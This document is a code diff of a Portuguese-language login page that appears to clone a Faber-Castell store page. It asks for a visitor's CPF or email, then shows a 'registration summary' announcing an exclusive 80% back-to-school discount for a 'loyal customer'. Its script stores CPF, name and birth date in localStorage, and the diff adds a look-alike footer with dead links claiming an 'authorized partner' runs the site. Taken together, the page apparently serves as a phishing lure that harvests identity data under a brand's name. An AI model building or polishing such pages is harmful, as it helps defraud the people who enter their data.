@@ -11,43 +11,43 @@
     :root{
       --brand-red:#D40E28;
       --brand-blue:#4a73b2;
+
       --text:#222;
       --muted:#6b7280;
-      --border:#d7d7d7;
+      --border:#dcdcdc;
       --bg:#ffffff;
       --err:#d12b2b;
 
-      /* Escalas responsivas (ajuste fino) */
-      --wrap-pad-top: clamp(22px, 3.5vw, 40px);
-      --wrap-pad-side: clamp(12px, 3vw, 16px);
-      --wrap-pad-bottom: clamp(44px, 6vw, 70px);
+      /* ✅ Proporções ajustadas para ficar no mesmo "tamanho visual" da referência */
+      --topbar-h: 88px;
 
-      --card-pad-y: clamp(22px, 4vw, 42px);
-      --card-pad-x: clamp(16px, 3.2vw, 36px);
+      --wrap-max: 420px;
+      --wrap-pad-top: 28px;
+      --wrap-pad-side: 16px;
+      --wrap-pad-bottom: 36px;
 
-      --radius: 8px;
+      --card-pad-y: 24px;
+      --card-pad-x: 20px;
 
-      --h1: clamp(26px, 4.2vw, 40px);
-      --h2: clamp(22px, 3.6vw, 34px);
+      --radius: 6px;
 
-      --label: clamp(16px, 2.6vw, 22px);
-      --fine: clamp(14px, 2.4vw, 22px);
+      --h1: 22px;
+      --h2: 18px;
 
-      --input-font: clamp(16px, 2.5vw, 20px);
-      --btn-font: clamp(18px, 3.2vw, 28px);
-      --outline-font: clamp(18px, 3.2vw, 30px);
+      --label: 14px;
+      --fine: 13px;
 
-      --input-h: clamp(54px, 7.5vw, 62px);
-      --btn-h: clamp(56px, 8vw, 68px);
-      --outline-h: clamp(56px, 8.2vw, 70px);
+      --input-font: 15px;
+      --btn-font: 16px;
+      --outline-font: 15px;
 
-      --brand-name: clamp(28px, 5.5vw, 42px);
-      --brand-sub: clamp(12px, 2.2vw, 16px);
-
-      --topbar-h: clamp(96px, 18vw, 140px);
+      --input-h: 48px;
+      --btn-h: 48px;
+      --outline-h: 46px;
     }
 
     *{ margin:0; padding:0; box-sizing:border-box; }
+
     body{
       font-family:"Sora", system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
       background:#fff;
@@ -64,52 +64,49 @@
       padding: 0 12px;
     }
 
-    /* LOGO NO HEADER */
     .brand-logo{
-      height: clamp(34px, 6vw, 54px);
-      width: auto;
-      display: block;
-      user-select: none;
+      height: 42px; /* ✅ equivalente visual ao da referência */
+      width:auto;
+      display:block;
+      user-select:none;
     }
 
     /* CONTAINER */
     .wrap{
-      max-width:780px;
-      margin:0 auto;
+      max-width: var(--wrap-max);
+      margin: 0 auto;
       padding: var(--wrap-pad-top) var(--wrap-pad-side) var(--wrap-pad-bottom);
     }
 
     /* CARD LOGIN */
     .card{
       background:var(--bg);
-      border:2px solid var(--border);
-      border-radius:6px;
-      padding: var(--card-pad-y) var(--card-pad-x) calc(var(--card-pad-y) - 8px);
-      max-width:640px;
-      margin:0 auto;
+      border:1px solid var(--border);
+      border-radius:var(--radius);
+      padding: var(--card-pad-y) var(--card-pad-x) calc(var(--card-pad-y) - 2px);
     }
 
     .card h1{
       font-size:var(--h1);
       font-weight:700;
-      margin-bottom: clamp(10px, 1.8vw, 14px);
+      margin-bottom:12px;
       text-align:left;
       letter-spacing:-0.2px;
     }
 
     .divider{
-      height:2px;
+      height:1px;
       background:var(--border);
-      margin: clamp(10px, 1.8vw, 12px) 0 clamp(18px, 3vw, 28px);
+      margin: 0 0 18px;
     }
 
     .form-error{
       display:none;
       text-align:left;
-      margin: 0 0 14px;
+      margin: 0 0 12px;
       color:var(--err);
       font-weight:700;
-      font-size: clamp(13px, 2.2vw, 16px);
+      font-size: 13px;
       line-height:1.25;
     }
 
@@ -118,16 +115,16 @@
       text-align:left;
       font-weight:600;
       font-size:var(--label);
-      margin-bottom: clamp(10px, 2vw, 14px);
+      margin-bottom:8px;
     }
 
     .input{
       width:100%;
       height:var(--input-h);
-      border:2px solid var(--border);
-      border-radius:6px;
+      border:1px solid var(--border);
+      border-radius:var(--radius);
       font-size:var(--input-font);
-      padding: 0 clamp(12px, 2.5vw, 16px);
+      padding: 0 12px;
       outline:none;
       transition:border-color .15s ease;
     }
@@ -136,7 +133,7 @@
     .btn-primary{
       width:100%;
       height:var(--btn-h);
-      margin-top: clamp(14px, 2.8vw, 22px);
+      margin-top:16px;
       border:none;
       border-radius: var(--radius);
       background:var(--brand-blue);
@@ -151,10 +148,10 @@
 
     .fineprint{
       text-align:center;
-      margin-top: clamp(14px, 2.8vw, 22px);
+      margin-top:16px;
       font-size:var(--fine);
-      line-height:1.45;
-      color:var(--text);
+      line-height:1.4;
+      color:#444;
     }
     .fineprint a{
       color:var(--text);
@@ -164,22 +161,20 @@
 
     /* BLOCO CRIAR CONTA */
     .below{
-      max-width:640px;
-      margin: clamp(20px, 4vw, 34px) auto 0;
+      margin:24px auto 0;
       text-align:center;
-      padding: 0 4px;
+      padding: 0 2px;
     }
     .below h2{
       font-size:var(--h2);
-      font-weight:700;
-      margin-bottom: clamp(12px, 2.6vw, 18px);
+      font-weight:600;
+      margin-bottom:12px;
     }
     .btn-outline{
       width:100%;
       height:var(--outline-h);
-      max-width: min(520px, 100%);
       border-radius: var(--radius);
-      border:2px solid var(--brand-blue);
+      border:1px solid var(--brand-blue);
       background:#fff;
       color:var(--brand-blue);
       font-size:var(--outline-font);
@@ -189,33 +184,31 @@
 
     /* TELA 2: RESUMO */
     .summary{
-      max-width:640px;
-      margin:0 auto;
-      border:2px solid var(--border);
-      border-radius:6px;
-      padding: clamp(20px, 3.8vw, 34px) clamp(16px, 3.2vw, 30px);
+      border:1px solid var(--border);
+      border-radius:var(--radius);
+      padding: 22px 18px;
       background:#fff;
     }
     .summary h1{
-      font-size: clamp(22px, 3.4vw, 34px);
+      font-size: 20px;
       font-weight:700;
-      margin-bottom: clamp(10px, 2vw, 14px);
+      margin-bottom:12px;
       text-align:left;
     }
 
     /* ✅ AVISO (com presente animado) */
     .badge{
-      display:inline-flex;
-      align-items:center;
+      display:flex;
+      align-items:flex-start;
       gap:10px;
       margin-top:10px;
       background:#fff3cd;
-      border:2px solid #ffe08a;
+      border:1px solid #ffe08a;
       color:#7a5a00;
       padding: 10px 12px;
       border-radius:10px;
       font-weight:700;
-      font-size: clamp(13px, 2.2vw, 16px);
+      font-size: 13px;
       line-height:1.35;
     }
 
@@ -223,39 +216,40 @@
       display:inline-flex;
       align-items:center;
       justify-content:center;
-      width: 30px;
-      height: 30px;
-      font-size: 20px;
+      width: 28px;
+      height: 28px;
+      font-size: 18px;
       transform-origin: 50% 60%;
       animation: giftFloat 2.6s ease-in-out infinite;
-      filter: drop-shadow(0 2px 6px rgba(0,0,0,.15));
+      filter: drop-shadow(0 2px 6px rgba(0,0,0,.12));
+      margin-top:1px;
+      flex: 0 0 auto;
     }
 
     @keyframes giftFloat{
       0%   { transform: translateY(0) rotate(0deg) scale(1); }
-      50%  { transform: translateY(-4px) rotate(-2deg) scale(1.03); }
+      50%  { transform: translateY(-3px) rotate(-2deg) scale(1.02); }
       100% { transform: translateY(0) rotate(0deg) scale(1); }
     }
 
-    /* respeita acessibilidade */
     @media (prefers-reduced-motion: reduce){
       .gift{ animation: none; }
     }
 
     .grid{
-      margin-top: clamp(14px, 3vw, 18px);
+      margin-top: 14px;
       display:grid;
       grid-template-columns: 1fr;
-      gap: 12px;
+      gap: 10px;
     }
     .row{
-      border:2px solid var(--border);
+      border:1px solid var(--border);
       border-radius:10px;
-      padding: 14px 14px;
+      padding: 12px 12px;
       text-align:left;
     }
     .row .k{
-      font-size: clamp(11px, 2vw, 12px);
+      font-size: 11px;
       color:var(--muted);
       font-weight:700;
       text-transform:uppercase;
@@ -263,51 +257,102 @@
     }
     .row .v{
       margin-top:6px;
-      font-size: clamp(15px, 2.6vw, 18px);
+      font-size: 15px;
       font-weight:700;
       color:var(--text);
       word-break:break-word;
     }
 
     .cta{
-      margin-top: 18px;
-      font-size: clamp(14px, 2.6vw, 18px);
-      line-height:1.55;
+      margin-top: 14px;
+      font-size: 14px;
+      line-height:1.5;
       text-align:left;
       color:#111;
     }
 
     .btn-row{
-      margin-top: 18px;
+      margin-top: 14px;
       display:flex;
-      gap:12px;
-      flex-wrap:wrap;
+      gap:10px;
     }
     .btn-small{
       flex:1;
-      min-width: 180px;
-      height: clamp(48px, 7vw, 56px);
+      height: 44px;
       border-radius:10px;
       border:none;
       cursor:pointer;
       font-weight:800;
-      font-size: clamp(14px, 2.4vw, 18px);
+      font-size: 14px;
     }
     .btn-small.primary{ background:var(--brand-blue); color:#fff; }
-    .btn-small.ghost{ background:#f3f4f6; color:#111; border:2px solid var(--border); }
+    .btn-small.ghost{ background:#f3f4f6; color:#111; border:1px solid var(--border); }
 
     /* LOADING */
     .loading{
       display:none;
-      margin-top: 12px;
-      font-size: clamp(12px, 2vw, 14px);
+      margin-top: 10px;
+      font-size: 12px;
       color:var(--muted);
       font-weight:600;
       text-align:left;
     }
 
-    @media (min-width: 1100px){
-      .wrap{ padding-left: 0; padding-right: 0; }
+    /* ✅ FOOTER NO MESMO "TAMANHO" DA REFERÊNCIA (sem copiar identidade/links proprietários) */
+    footer{
+      border-top:1px solid var(--border);
+      background:#fff;
+    }
+    .footer-wrap{
+      max-width: var(--wrap-max);
+      margin: 0 auto;
+      padding: 26px 16px 40px;
+      color:#5b5b5b;
+      font-size: 13px;
+      line-height:1.45;
+      text-align:center;
+    }
+    .footer-block{ margin-bottom: 22px; }
+    .footer-title{
+      font-weight:800;
+      color: var(--brand-blue);
+      font-size: 20px;
+      margin-bottom: 10px;
+    }
+    .footer-links{
+      display:flex;
+      flex-direction:column;
+      gap:8px;
+    }
+    .footer-links a{
+      color:#5b5b5b;
+      text-decoration:none;
+      font-weight:500;
+    }
+    .footer-links a:hover{ text-decoration:underline; }
+
+    .social{
+      display:flex;
+      justify-content:center;
+      gap:12px;
+      margin-top:10px;
+    }
+    .social .ico{
+      width:36px;
+      height:36px;
+      border-radius:7px;
+      background:#e5e7eb;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      font-weight:800;
+      color:#444;
+      user-select:none;
+    }
+    .footer-note{
+      margin-top: 6px;
+      font-size: 12px;
+      color:#6b7280;
     }
   </style>
 </head>
@@ -321,7 +366,8 @@
 
   <!-- HEADER -->
   <header class="topbar">
-    <img class="brand-logo" src="/images/logo-fabercastell.png" alt="Faber-Castell">
+    <!-- ✅ use sua própria imagem de logo (não copie a marca de terceiros) -->
+    <img class="brand-logo" src="/images/logo-fabercastell.png" alt="Logo">
   </header>
 
   <main class="wrap">
@@ -331,11 +377,10 @@
         <h1>Faça seu login</h1>
         <div class="divider"></div>
 
-        <!-- ✅ erro de validação -->
         <div class="form-error" id="formError">CPF inválido. Verifique e tente novamente.</div>
 
         <form id="loginForm">
-          <label for="cpfEmail">Digite seu CPF:</label>
+          <label for="cpfEmail">E-mail ou CPF:</label>
           <input
             id="cpfEmail"
             class="input"
@@ -369,7 +414,6 @@
       <div class="summary">
         <h1>Resumo do cadastro</h1>
 
-        <!-- ✅ AVISO COM PRESENTE ANIMADO -->
         <div class="badge">
           <span class="gift" aria-hidden="true">🎁</span>
           <span>Como cliente fiel, você foi selecionado para receber 80% de desconto exclusivo na Promoção de Volta às Aulas.</span>
@@ -388,6 +432,46 @@
       </div>
     </section>
   </main>
+
+  <!-- ✅ Footer com proporção igual à referência (sem copiar marca/links) -->
+  <footer>
+    <div class="footer-wrap">
+
+      <div class="footer-block">
+        <div class="footer-title">Institucional</div>
+        <div class="footer-links">
+          <a href="#" onclick="return false;">Sobre a loja</a>
+          <a href="#" onclick="return false;">Assessoria</a>
+          <a href="#" onclick="return false;">Atendimento</a>
+          <a href="#" onclick="return false;">Sustentabilidade</a>
+          <a href="#" onclick="return false;">Cursos online</a>
+          <a href="#" onclick="return false;">Lojista</a>
+        </div>
+      </div>
+
+      <div class="footer-block">
+        <div class="footer-title">Redes Sociais</div>
+        <div class="social" aria-label="Redes sociais">
+          <div class="ico" title="Instagram">⌁</div>
+          <div class="ico" title="Facebook">f</div>
+          <div class="ico" title="X">𝕏</div>
+          <div class="ico" title="YouTube">▶</div>
+        </div>
+      </div>
+
+      <div class="footer-block">
+        <div class="footer-title">Certificados e Segurança</div>
+        <div class="footer-links">
+          <a href="#" onclick="return false;">Certificação digital</a>
+        </div>
+      </div>
+
+      <div class="footer-note">
+        Você está em um site operado por parceiro autorizado. As informações fornecidas seguem a Política de Privacidade.
+      </div>
+
+    </div>
+  </footer>
 
   <script>
     const $ = (sel) => document.querySelector(sel);
@@ -475,10 +559,10 @@
         cpf: payload.cpf
       }));
 
-      // completo (se você quiser usar mais campos depois)
+      // completo
       localStorage.setItem(STORAGE_KEY_FULL, JSON.stringify(payload));
 
-      // compat (se já tiver página lendo essas chaves)
+      // compat
       localStorage.setItem("cpf", payload.cpf);
       localStorage.setItem("nome", payload.nome);
       localStorage.setItem("nascimento", payload.nascimento);
